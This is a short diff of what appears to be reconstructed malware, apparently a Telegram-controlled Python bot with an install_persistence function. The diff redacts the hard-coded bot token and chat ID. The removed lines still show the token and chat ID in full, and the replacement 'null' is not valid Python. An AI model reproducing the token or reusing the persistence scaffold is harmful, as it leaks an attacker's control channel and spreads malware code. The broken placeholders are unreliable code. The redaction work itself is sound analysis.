@@ -3,8 +3,8 @@ import time
 import subprocess
 import requests
 # Credential recovered from the bytecode has been redacted in this reconstruction.
-TOKEN = "8876255842:AAF93POgQf1u-RbfzNNWo8boQK9cAvIKPFM"
-CHAT_ID = "8604350172"
+TOKEN = null
+CHAT_ID = null
 LAST_UPDATE_ID = 0
 def install_persistence():
     try:
